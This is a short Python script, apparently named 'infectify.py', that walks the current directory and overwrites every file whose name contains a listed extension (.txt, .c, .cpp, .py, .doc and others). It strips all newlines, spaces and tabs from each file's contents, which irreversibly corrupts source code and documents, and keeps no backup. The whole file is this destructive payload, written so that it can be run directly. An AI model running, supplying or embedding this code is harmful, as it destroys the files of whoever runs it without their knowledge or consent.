import os

files = os.listdir(os.getcwd())

extensions = [".txt", ".cpp", ".cs", ".c", ".in", ".out", ".doc", ".docx", ".py"]
inputfile = ""

for i in range(len(files)):
    for j in range(len(extensions)):
        if extensions[j] in files[i]:
            inputfile = open(files[i], "r")
            data = inputfile.read()
            if(files[i] != "infectify.py"):
                outputfile = open(files[i], "w")            
                step = data.split("\n")
                data = ""
                for i in range(len(step)):
                    data += step[i]
                step = data.split(" ")
                data = ""
                for i in range(len(step)):
                    data += step[i]
                step = data.split("\t")
                data = ""
                for i in range(len(step)):
                    data += step[i]
                outputfile.write(data)